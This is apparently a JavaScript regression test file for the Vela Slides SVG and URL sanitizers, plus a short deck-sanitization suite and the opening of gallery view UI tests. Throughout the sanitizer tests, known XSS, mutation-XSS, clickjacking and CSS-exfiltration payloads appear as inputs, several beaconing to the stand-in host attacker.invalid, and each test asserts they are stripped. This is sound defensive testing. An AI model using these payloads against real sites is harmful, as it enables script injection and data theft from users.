// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
// ── Security: SVG sanitizer bypass regression (v12.44) ───────────────
// The svg block previously used a regex chain that let unquoted and
// whitespace-obfuscated javascript: URIs through. These assert the
// DOM-based sanitizeSvgMarkup() neutralizes the known bypasses.
uiSuite("SVG Sanitizer (XSS)", [
  { name: "Benign svg survives sanitization", fn: async () => {
    const out = sanitizeSvgMarkup("<rect x='1' y='1' width='8' height='8' fill='#3b82f6'/>");
    return out.includes("<rect") && out.includes("#3b82f6");
  }},
  { name: "Unquoted javascript: href stripped (or whole svg rejected)", fn: async () => {
    const out = sanitizeSvgMarkup('<a href=javascript:alert(1)><text>x</text></a>');
    return !/javascript:/i.test(out);
  }},
  { name: "Quoted javascript: href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<a href="javascript:alert(1)"><text>x</text></a>');
    return !/javascript:/i.test(out) && !/href\s*=/i.test(out.replace(/data-blocked-href/gi, ""));
  }},
  { name: "Whitespace-obfuscated scheme neutralized", fn: async () => {
    const out = sanitizeSvgMarkup('<a href="java\tscript:alert(1)"><text>x</text></a>');
    // either attr removed, or whitespace normalized so it is no longer a javascript scheme
    return !/javascript:/i.test(out.replace(/\s+/g, ""));
  }},
  { name: "xlink:href javascript: stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<a xlink:href="javascript:alert(1)"><text>x</text></a>');
    return !/javascript:/i.test(out);
  }},
  { name: "data: URI in href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<image href="data:text/html,<script>alert(1)</script>" />');
    return !/data:/i.test(out);
  }},
  { name: "Event handler attribute stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<rect width="10" height="10" onload="alert(1)" />');
    return !/\bon\w+\s*=/i.test(out);
  }},
  { name: "Event handler on <style> stripped (bare)", fn: async () => {
    // <style> is a common SVG/HTML element: a surviving on* handler goes live on
    // the HTML re-parse. Must be stripped like any other element's handler.
    const out = sanitizeSvgMarkup('<style onload="alert(1)">.a{fill:#000}</style><rect/>');
    return !/\bon\w+\s*=/i.test(out);
  }},
  { name: "Event handler on <style> nested in <desc>/<title> stripped (mXSS)", fn: async () => {
    // desc/title are HTML integration points — the classic namespace-confusion
    // mutation-XSS setup. Neither the nested handler nor a top-level one survives.
    const a = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><rect/>');
    const b = sanitizeSvgMarkup('<title><style onload="alert(1)">x</style></title><rect/>');
    return !/\bon\w+\s*=/i.test(a) && !/\bon\w+\s*=/i.test(b);
  }},
  { name: "SVG output has no handler after HTML re-parse (mXSS backstop)", fn: async () => {
    // Independent output-side check: whatever survives must be inert when the
    // sink re-parses it as HTML — no element carries an on* handler.
    const out = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><g onclick="alert(2)"><rect/></g>');
    const html = new DOMParser().parseFromString(`<div>${out}</div>`, "text/html");
    return ![...html.querySelectorAll("*")].some((el) => [...el.attributes].some((at) => /^on/i.test(at.name)));
  }},
  { name: "script element stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<g><script>alert(1)</script></g>');
    return !/<script/i.test(out);
  }},
  { name: "foreignObject element stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<foreignObject><img src=x onerror=alert(1)></foreignObject>');
    return !/<foreignobject/i.test(out) && !/onerror/i.test(out);
  }},
  // CSS-text exfil: <style>/<link> inside SVG fire an outbound GET via url() /
  // @import / rel=stylesheet with no CSP backstop. We filter <style> textContent
  // (preserve legitimate class-based styling and url(#fragment) refs that
  // Mermaid/Vera diagrams need), and block <link> outright.
  { name: "SVG <style> with external url() removed (exfil blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>* { background: url("https://attacker.invalid/?d=x") }</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> @import removed (exfil blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>@import url("https://attacker.invalid/x.css");</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/@import/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> with CSS \\XX escape removed (escape-bypass blocked)", fn: async () => {
    // \75rl(...) decodes to url(...) in the CSS parser — escape-token bypass
    const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> element stripped (document-global CSS disallowed; shapes still render)", fn: async () => {
    // A <style> is document-global (not SVG-scoped) — dropped outright, not filtered.
    // The shape element survives so geometry still renders; only the class CSS is gone.
    const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
    return !/<style[\s>]/i.test(out) && !/#3b82f6/.test(out) && /<rect/i.test(out);
  }},
  { name: "SVG url(#fragment) paint refs preserved via presentation attrs (<style> dropped)", fn: async () => {
    // Paint-server refs belong on presentation attributes, which remain allowed+validated.
    const out = sanitizeSvgMarkup('<rect fill="url(#grad1)" marker-end="url(#mark)" clip-path="url(#c)"/>');
    return /fill="url\(#grad1\)"/.test(out) && /marker-end="url\(#mark\)"/.test(out) && /clip-path="url\(#c\)"/.test(out);
  }},
  // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
  // render. image-set/image/cross-fade/src were the residual bypass of the
  // v12.53 url()-only filter. Vela decks load NOTHING external.
  { name: "SVG <style> image-set() string source removed (beacon blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>[x^="V"]{background:image-set("https://attacker.invalid/b?p=V" 1x)}</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> -webkit-image-set / cross-fade / src() removed", fn: async () => {
    const out = sanitizeSvgMarkup('<style>a{background:-webkit-image-set("https://attacker.invalid/x" 1x)}b{x:cross-fade(url(#a),"https://attacker.invalid/y",50%)}c{x:src("https://attacker.invalid/z")}</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  // v13.18 — detection must not depend on a closing ')': the CSS tokenizer consumes
  // an UNTERMINATED url( to end-of-input and still emits a fetchable url-token, so a
  // paren-balanced regex missed both the bare and quoted unterminated forms.
  { name: "SVG <style> unterminated url( (bare) removed (EOF url-token)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>rect{fill:url(https://attacker.invalid/b?d=x</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> unterminated url( (quoted) removed (EOF url-token)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>rect{fill:url("https://attacker.invalid/b?d=x</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG style='…url(https://…' unterminated attr removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect style="background-image:url(https://attacker.invalid/b" mask="url(https://attacker.invalid/m"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG scheme-relative url(//host) removed", fn: async () => {
    const out = sanitizeSvgMarkup('<style>*{background:url(//attacker.invalid/b)}</style><rect fill="url(//attacker.invalid/p)"/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> @font-face char-exfil removed", fn: async () => {
    const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
    return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG url(#fragment) whitespace on presentation attr preserved (no false reject)", fn: async () => {
    // isSvgStyleSafe still guards url-ref presentation attrs; url( #frag ) must not false-reject.
    const out = sanitizeSvgMarkup('<rect fill="url( #grad )" clip-path="url(#c)"/>');
    return /#grad/.test(out) && /url\(#c\)/.test(out);
  }},
  // v13.46 — CSS custom-property indirection. A lexical value filter inspects the
  // DECLARED text; a custom property is an untyped token bag substituted at
  // computed-value time, i.e. after those checks have run, so an indirected value
  // can re-assemble a fetching primitive the filter never saw. Custom properties
  // also inherit, so the store and the load can sit on different elements.
  { name: "SVG custom-property indirection into an image source removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect style=\'--p:"https:attacker.invalid/b";background-image:image-set(var(--p) 1x)\'/>');
    return !/attacker\.invalid/i.test(out) && !/var\s*\(/i.test(out) && !/--p/.test(out);
  }},
  { name: "SVG custom property inherited across elements (store on <g>, load on child) removed", fn: async () => {
    const out = sanitizeSvgMarkup('<g style=\'--p:"https:attacker.invalid/b"\'><rect style="mask-image:image-set(var(--p) 1x)"/></g>');
    return !/attacker\.invalid/i.test(out) && !/var\s*\(/i.test(out);
  }},
  { name: "SVG attr()/env() indirection removed (whole substitution family)", fn: async () => {
    // attr() reads a DOM attribute the sanitizer preserves verbatim, so the URL
    // never appears in the CSS text; env() binds at the same late stage as var().
    const a = sanitizeSvgMarkup('<rect data-u="https://attacker.invalid/b" style="fill:attr(data-u url)"/>');
    const b = sanitizeSvgMarkup('<rect data-u="url(https://attacker.invalid/b)" fill="attr(data-u)"/>');
    const c = sanitizeSvgMarkup('<rect style="background-image:image-set(env(x) 1x)"/>');
    return !/attr\s*\(|env\s*\(/i.test(a + b + c) && !/\sstyle=/i.test(a) && !/\sfill=/i.test(b);
  }},
  { name: "SVG transform allowlisted in inline style (parity with the transform attribute)", fn: async () => {
    // The transform ATTRIBUTE was never gated, so rejecting only the CSS spelling
    // removed real exported-diagram layout without removing any capability.
    const out = sanitizeSvgMarkup('<g style="transform:translate(10px,10px)"><rect width="10" height="10" fill="red"/></g>');
    return /transform:translate\(10px,10px\)/.test(out) && /fill="red"/.test(out);
  }},
  { name: "SECURITY: neither transform spelling escapes the clipped render sink", fn: async () => {
    // The UI-integrity invariant that makes the line above safe: transform cannot
    // leave an overflow:hidden ancestor (position, which can, stays rejected).
    const host = document.createElement("div");
    host.style.cssText = "width:120px;height:80px;overflow:hidden;position:relative";
    document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup(
        '<g style="transform:translate(-900px,-900px) scale(60)" transform="translate(-900,-900) scale(60)">' +
        '<rect width="20" height="20" fill="red"/></g>');
      const hb = host.getBoundingClientRect();
      // Hit-test, not bounding rects: SVG clips paint, so a rect over-reports.
      const probes = [[hb.right + 40, hb.bottom + 40], [Math.floor(innerWidth / 2), Math.floor(innerHeight / 2)]];
      const escaped = probes.some(([x, y]) => {
        const el = document.elementFromPoint(x, y);
        return !!(el && host.contains(el));
      });
      const noPositioning = !/position\s*:/i.test(host.innerHTML);
      const rendered = /fill="red"/.test(host.innerHTML);
      return !escaped && noPositioning && rendered;
    } finally { host.remove(); }
  }},
  { name: "SECURITY: deck SVG cannot un-clip its own viewport to cover sibling content", fn: async () => {
    // overflow on an <svg> overrides the UA viewport clip, so a negative-geometry
    // child paints and hit-tests outside the deck's box. Prove it against a real
    // sibling: the escaped rect must not become the element at the sibling's point.
    const sib = document.createElement("div");
    sib.style.cssText = "width:200px;height:60px;background:#ddd";
    const host = document.createElement("div");
    host.style.cssText = "width:60px;height:60px";
    document.body.appendChild(sib); document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup(
        '<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" overflow="visible" style="overflow:visible">' +
        '<rect x="-300" y="-300" width="900" height="900" fill="red"/></svg>');
      const r = sib.getBoundingClientRect();
      const hit = document.elementFromPoint(Math.floor(r.left + r.width / 2), Math.floor(r.top + r.height / 2));
      const covered = !!(hit && host.contains(hit));
      const rendered = /<rect/i.test(host.innerHTML);
      return !covered && !/overflow/i.test(host.innerHTML) && rendered;
    } finally { sib.remove(); host.remove(); }
  }},
  { name: "SECURITY: deck SVG cannot become an invisible click interceptor over sibling content", fn: async () => {
    // transform on the BOUNDARY <svg> relocates the box and its hit-testing while
    // painting nothing — deck content silently takes clicks meant for a neighbour.
    // Victim is static and precedes the host so it cannot out-rank the attacker in
    // paint order (a positioned victim would mask a real escape).
    const victim = document.createElement("div");
    victim.style.cssText = "width:300px;height:60px;background:#dde";
    const host = document.createElement("div");
    host.style.cssText = "width:240px;height:90px";
    document.body.appendChild(victim); document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup(
        '<svg xmlns="http://www.w3.org/2000/svg" width="240" height="90" transform="scale(20)" style="transform:scale(20)">' +
        '<rect width="240" height="90" fill="none" pointer-events="all"/></svg>');
      const r = victim.getBoundingClientRect();
      const hit = document.elementFromPoint(Math.floor(r.left + r.width / 2), Math.floor(r.top + r.height / 2));
      const intercepts = !!(hit && host.contains(hit));
      const clean = !/transform|pointer-events/i.test(host.innerHTML);
      const rendered = /<rect/i.test(host.innerHTML);
      return !intercepts && clean && rendered;
    } finally { victim.remove(); host.remove(); }
  }},
  { name: "SVG inner transform/filter preserved (diagram layout still works)", fn: async () => {
    const out = sanitizeSvgMarkup('<g transform="translate(5,5)" filter="url(#f)" style="transform-origin:0 0"><rect width="9" height="9" style="filter:blur(2px)"/></g>');
    return /transform="translate\(5,5\)"/.test(out) && /filter="url\(#f\)"/.test(out) &&
           /transform-origin:0 0/.test(out) && /filter:blur\(2px\)/.test(out);
  }},
  { name: "SVG marker overflow=visible preserved (arrowhead idiom)", fn: async () => {
    const out = sanitizeSvgMarkup('<defs><marker id="a" overflow="visible" markerWidth="4" markerHeight="4"><path d="M0,-5L10,0L0,5"/></marker></defs><line x1="0" y1="0" x2="9" y2="9" marker-end="url(#a)"/>');
    return /overflow="visible"/.test(out) && /url\(#a\)/.test(out);
  }},
  { name: "SVG slashless authority (scheme without //) removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect style="background-image:url(https:attacker.invalid/b)" fill="url(https:attacker.invalid/p)"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG inline-style property allowlist drops image-loading/overlay properties", fn: async () => {
    const out = sanitizeSvgMarkup('<rect fill="red" style="background-image:url(#a);cursor:url(#c),auto;transform:scale(500)"/>');
    return !/style=/i.test(out) && /fill="red"/.test(out);
  }},
  { name: "SVG legitimate paint/text inline style preserved (no false reject)", fn: async () => {
    const out = sanitizeSvgMarkup('<text style="fill:#3b82f6;font-family:Inter,sans-serif;text-anchor:middle;opacity:0.8;text-transform:uppercase;cursor:pointer">A</text>');
    return /fill:#3b82f6/.test(out) && /text-anchor:middle/.test(out) &&
           /text-transform:uppercase/.test(out) && /cursor:pointer/.test(out);
  }},
  { name: "SVG double-hyphen fragment ids preserved (custom-property reject is declaration-anchored)", fn: async () => {
    // `--` inside url(#id) is ordinary id naming, not a custom property: a store
    // can only be introduced at the start of a declaration.
    const out = sanitizeSvgMarkup('<rect fill="url(#grad--blue)" clip-path="url(#clip--1)" style="stroke:url(#s--2)"/>');
    return /url\(#grad--blue\)/.test(out) && /url\(#clip--1\)/.test(out) && /url\(#s--2\)/.test(out);
  }},
  { name: "SECURITY: browser-truth — indirected deck SVG CSS makes no outbound request", fn: async () => {
    // Real-sink proof: render the sanitizer's OUTPUT the way the app does and watch
    // the browser's own resource timeline. A source-level "the regex rejects it" is
    // not evidence that nothing fetched; a PerformanceObserver entry is.
    const host = document.createElement("div");
    document.body.appendChild(host);
    const seen = [];
    const obs = new PerformanceObserver((l) => { for (const e of l.getEntries()) seen.push(e.name); });
    try {
      obs.observe({ entryTypes: ["resource"] });
      host.innerHTML = sanitizeSvgMarkup(
        '<svg xmlns="http://www.w3.org/2000/svg" style=\'--p:"https:attacker.invalid/b1";background-image:image-set(var(--p) 1x)\'>' +
        '<rect style=\'--q:"https:attacker.invalid/b2";mask-image:image-set(var(--q) 1x)\'/></svg>');
      // Poll rather than sleep a fixed window: a failed request to an unresolvable
      // host lands as a resource entry at an unpredictable delay, and a window too
      // short lets the observer see nothing — which would silently reduce this to
      // the string check below and stop it detecting a regression. Bail out early
      // the moment an entry appears (the failing direction needs no waiting).
      for (let i = 0; i < 30 && !seen.length; i++) await new Promise((r) => setTimeout(r, 100));
      for (const e of obs.takeRecords()) seen.push(e.name);
      return !seen.some((u) => /attacker\.invalid/i.test(u)) && !/attacker\.invalid/i.test(host.innerHTML);
    } finally { obs.disconnect(); host.remove(); }
  }},
  { name: "SECURITY: deck SVG <style> cannot restyle/relocate app chrome (S16/S17 redress+clickjack)", fn: async () => {
    // The load-bearing regression test for the UI-integrity family: render a
    // hostile deck SVG the SAME way the app does (sanitize -> innerHTML) and prove
    // deck CSS cannot reach a real app control (no restyle, no reposition, no hide).
    const victim = document.createElement("button");
    victim.setAttribute("title", "Delete slide (Del)");
    victim.style.background = "rgb(1, 2, 3)";
    document.body.appendChild(victim);
    const host = document.createElement("div");
    document.body.appendChild(host);
    try {
      const payload = '<style>button[title^="Delete slide"]{position:fixed !important;background:rgb(34,197,94) !important;opacity:0 !important}*{color:red !important}</style><rect width="10" height="10"/>';
      host.innerHTML = sanitizeSvgMarkup(payload);
      const noStyle = !host.querySelector("style") && !/<style[\s>]/i.test(host.innerHTML);
      const cs = getComputedStyle(victim);
      const bg = (cs.backgroundColor || "").replace(/\s/g, "");
      const unaffected = bg === "rgb(1,2,3)" && cs.position !== "fixed" && cs.opacity === "1";
      return noStyle && unaffected;
    } finally { host.remove(); victim.remove(); }
  }},
  { name: "SECURITY: deck SVG inline style cannot overlay app chrome (fixed-position clickjack)", fn: async () => {
    // R4A vector: the <style> ELEMENT was removed, but an inline style="" on an SVG
    // element carrying position:fixed/inset/z-index/viewport-sizing escapes the
    // non-clipped study-notes/teacher diagram sinks and overlays whole-app chrome.
    // Prove the real sanitizer output produces no viewport-covering fixed/absolute element.
    const host = document.createElement("div");
    document.body.appendChild(host);
    try {
      const payload = '<rect fill="red" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;pointer-events:auto"/><g style="position:fixed;inset:0;z-index:99999"><rect width="50" height="50"/></g>';
      host.innerHTML = sanitizeSvgMarkup(payload);
      const overlay = Array.from(host.querySelectorAll("*")).some((el) => {
        const p = getComputedStyle(el).position;
        return p === "fixed" || p === "absolute";
      });
      const mid = document.elementFromPoint(Math.floor(innerWidth / 2), Math.floor(innerHeight / 2));
      const covered = !!(mid && host.contains(mid));
      const clean = !/position\s*:/i.test(host.innerHTML) && !/z-index/i.test(host.innerHTML) && /fill="red"/.test(host.innerHTML);
      return !overlay && !covered && clean;
    } finally { host.remove(); }
  }},
  { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
    const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG <feImage href> external removed (Roundcube class)", fn: async () => {
    const out = sanitizeSvgMarkup('<filter><feImage href="https://attacker.invalid/b.png"/><feImage xlink:href="https://attacker.invalid/c.png"/></filter>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG #fragment paint refs + <a> https click-link preserved (v12.59)", fn: async () => {
    const refs = sanitizeSvgMarkup('<rect fill="url(#grad)" clip-path="url(#c)"/>');
    const link = sanitizeSvgMarkup('<a href="https://example.com/x"><text>hi</text></a>');
    return /url\(#grad\)/.test(refs) && /url\(#c\)/.test(refs) && /href="https:\/\/example\.com\/x"/.test(link);
  }},
  { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
    const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
    return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
  }},
  // Mutation-XSS round-trip: sanitize, then re-parse as HTML exactly like
  // dangerouslySetInnerHTML does, and assert no live event handler materializes.
  { name: "CDATA-in-style mXSS round-trip neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<style><![CDATA[</style><img src=x onerror=alert(1)>]]" + "></style>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
  }},
  { name: "CDATA-in-text mXSS round-trip neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<text><![CDATA[</text><img src=x onerror=alert(1)>]]" + "></text>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
  }},
  { name: "Comment-node smuggling neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<!--<img src=x onerror=alert(1)>-->");
    const d = document.createElement("div"); d.innerHTML = out;
    return !d.querySelector("img") && !/onerror/i.test(out);
  }},
  { name: "sanitizeUrl blocks javascript:/data:/vbscript:", fn: async () => {
    return sanitizeUrl("javascript:alert(1)") === "" &&
           sanitizeUrl("data:text/html,<script>alert(1)</script>") === "" &&
           sanitizeUrl("vbscript:msgbox(1)") === "" &&
           sanitizeUrl("https://example.com/x") === "https://example.com/x";
  }},
  { name: "sanitizeUrl rejects UNC/backslash/protocol-relative refs (parse-vs-emit)", fn: async () => {
    // A schemeless authority ref parses as http(s) (passing the allowlist) but
    // must not survive raw into an export hyperlink target — it is rejected, not
    // emitted verbatim. http(s) links come back in canonical form.
    return sanitizeUrl("\\\\host\\share\\x") === "" &&
           sanitizeUrl("//host.example/x") === "" &&
           sanitizeUrl("/\\host/x") === "" &&
           sanitizeUrl("http:\\\\host\\x") === "" &&
           sanitizeUrl("https:/host.example") === "" &&
           sanitizeUrl("https://host.example/a") === "https://host.example/a" &&
           sanitizeUrl("data:image/png;base64,AAAA", ["data:"]) === "data:image/png;base64,AAAA";
  }},
  { name: "item-level links sanitized by sanitizeBlock", fn: async () => {
    const ir = sanitizeBlock({ type: "icon-row", items: [{ text: "x", link: "javascript:alert(1)" }] });
    const fl = sanitizeBlock({ type: "flow", items: [{ label: "n", link: "javascript:alert(1)" }] });
    return !ir.items[0].link && !fl.items[0].link;
  }},
  { name: "SMIL animate/animateTransform/animateMotion stripped", fn: async () => {
    const a = sanitizeSvgMarkup('<a><animate attributeName="href" to="javascript:alert(1)" begin="0s"/><text>x</text></a>');
    const t = sanitizeSvgMarkup('<rect><animateTransform attributeName="transform" type="rotate" onbegin="alert(1)"/></rect>');
    const mo = sanitizeSvgMarkup('<rect><animateMotion onbegin="alert(1)" dur="1s"/></rect>');
    return !/<animate/i.test(a) && !/<animatetransform/i.test(t) && !/<animatemotion/i.test(mo) && !/onbegin/i.test(t + mo);
  }},
  // Entity-encoded scheme: parser decodes &#58;/&#x3a;/&#115; before the scheme check runs
  { name: "Entity-encoded javascript: scheme stripped (dec/hex/letter)", fn: async () => {
    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a", d).some((a) => /^\s*javascript:/i.test((a.getAttribute("href") || "").replace(/\s/g, ""))); };
    return !hasJsAnchor('<a href="javascript&#58;alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="javascript&#x3a;alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="java&#115;cript:alert(1)"><text>x</text></a>');
  }},
  // Regex-class bypasses: tag reconstruction + unclosed/incomplete tags → fail-closed empty output
  { name: "Tag-reconstruction <scr<script>..ipt> neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<scr<script></script>ipt>alert(1)</scr<script></script>ipt>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !/<script/i.test(out) && !d.querySelector("script");
  }},
  // sanitizeString: single-pass /<[^>]*>/ is incomplete (an unclosed "<script" has
  // no ">" to match, and reconstruction can rejoin fragments). Fixpoint loop +
  // residual "<" strip must leave no live tag opener, while bare "<" math survives.
  { name: "sanitizeString neutralizes unclosed/reconstructed tags", fn: async () => {
    const bad = ["<script", "<scr<script>ipt>alert(1)", "<img src=x onerror=alert(1)", "<<script>>alert"];
    const clean = bad.every((s) => { const o = sanitizeString(s); return !/<script/i.test(o) && !/<[a-z!/]/i.test(o); });
    return clean && sanitizeString("a < b") === "a < b";
  }},
  { name: "Unclosed iframe/embed/script/foreignObject neutralized", fn: async () => {
    const danger = (mk) => { const out = sanitizeSvgMarkup(mk); const d = document.createElement("div"); d.innerHTML = out;
      return !!d.querySelector("iframe,embed,script,foreignObject") ||
             _$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name))); };
    return !danger('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">') &&
           !danger('<embed src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">') &&
           !danger("<script>alert(1)") &&
           !danger("<foreignObject><img src=x onerror=alert(1)>");
  }},
  { name: "vbscript: via xlink:href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="vbscript:msgbox(1)"><text>x</text></a></svg>');
    return !/vbscript:/i.test(out);
  }},
  // Mixed-case schemes — DOMParser preserves case in attribute values; the sanitizer
  // must fold case before scheme comparison.
  { name: "Mixed-case javascript:/data:/vbscript: schemes stripped", fn: async () => {
    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a,image", d).some((el) => {
        const v = (el.getAttribute("href") || el.getAttribute("xlink:href") || "").replace(/[\u0000-\u0020]/g, "").toLowerCase();
        return v.startsWith("javascript:") || v.startsWith("data:") || v.startsWith("vbscript:"); }); };
    return !hasJsAnchor('<a href="JaVaScRiPt:alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="JAVASCRIPT:alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="Data:text/html,<script>alert(1)</script>"><text>x</text></a>') &&
           !hasJsAnchor('<a xlink:href="VbScript:msgbox(1)"><text>x</text></a>');
  }},
  // Allowlist enforcement — unexpected protocols (file:, blob:, chrome:, intent:) must be
  // stripped after browser normalization, not just the historic js:/data:/vbscript: trio.
  { name: "Unexpected protocols (file:/blob:/chrome:/intent:) stripped from href", fn: async () => {
    const has = (mk, scheme) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a", d).some((el) => (el.getAttribute("href") || "").toLowerCase().startsWith(scheme)); };
    return !has('<a href="file:///etc/passwd"><text>x</text></a>', "file:") &&
           !has('<a href="blob:https://x/abc"><text>x</text></a>', "blob:") &&
           !has('<a href="chrome://settings"><text>x</text></a>', "chrome:") &&
           !has('<a href="intent://x"><text>x</text></a>', "intent:");
  }},
  // Allowlisted schemes + fragment + relative must SURVIVE the allowlist (regression guard).
  { name: "Allowlisted href schemes preserved (http/https/mailto/tel/#frag/relative)", fn: async () => {
    const keptHref = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      const a = d.querySelector("a"); return a && a.getAttribute("href"); };
    return !!keptHref('<a href="https://example.com/x"><text>x</text></a>') &&
           !!keptHref('<a href="http://example.com/x"><text>x</text></a>') &&
           !!keptHref('<a href="mailto:a@b.c"><text>x</text></a>') &&
           !!keptHref('<a href="tel:+15551234"><text>x</text></a>') &&
           !!keptHref('<a href="#anchor"><text>x</text></a>') &&
           !!keptHref('<a href="path/to/x.svg"><text>x</text></a>');
  }},
]);

// ── Security: deck-level sanitization (fail-closed + clamp + IMPORT_CONCEPTS) ──
uiSuite("Deck Sanitization (XSS)", [
  { name: ">50 lanes clamps to 50 without throwing (no fail-open trigger)", fn: async () => {
    const lanes = []; for (let i = 0; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
    let threw = false, res = null;
    try { res = validateAndSanitizeDeck({ deckTitle: "x", lanes }); } catch (e) { threw = true; }
    return !threw && res && res.lanes.length === 50;
  }},
  { name: "Large deck still sanitizes item-level javascript: link", fn: async () => {
    const lanes = [{ title: "L0", items: [{ title: "m", slides: [{ blocks: [
      { type: "icon-row", items: [{ text: "Click", link: "javascript:alert(1)" }] }] }] }] }];
    for (let i = 1; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
    const res = validateAndSanitizeDeck({ deckTitle: "x", lanes });
    const ir = res.lanes[0].items[0].slides[0].blocks.find((b) => b.type === "icon-row");
    return !!ir && !ir.items[0].link;
  }},
  { name: "Non-whitelisted block type dropped by sanitizeBlock", fn: async () => {
    return sanitizeBlock({ type: "NOT_A_BLOCK", evil: true }) === null;
  }},
]);

// ── v10: Gallery View Suite ──────────────────────────────────────────
uiSuite("Gallery View", [
  { name: "Enter fullscreen for gallery tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"));
  }},
  { name: "Gallery reachable from the fullscreen view switch", fn: async () => {
    await _waitFor(() => _$("[data-testid='fs-view-switch-gallery']"), 2000);
  }},
  { name: "G key opens gallery", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    // 5000ms (was 2000ms): tolerates a ~2x slower CI host — this only
    // gates the gallery-open render, not a demo wait floor.
    await _waitFor(() => _$text("GALLERY"), 5000);
  }},
  { name: "Gallery shows slide count", fn: async () => {
    await _waitFor(() => {
      const el = _$text("slides");
      return el && /\d+\s*slides/.test(el.textContent);
    }, 2000);
  }},
  { name: "Gallery shows module grouping", fn: async () => {
    // Should have module labels (colored text above first slide of each module)
    // Look for any text matching a known module title in mono font
    await _waitFor(() => {
      const monos = _$$("span").filter(s => s.style?.fontFamily?.includes("mono") && s.style?.fontWeight >= 600 && s.style?.letterSpacing);
      return monos.length > 0;
    }, 2000);
  }},
  { name: "Gallery has thumbnail cards", fn: async () => {
    // Should have multiple clickable card divs with slide titles
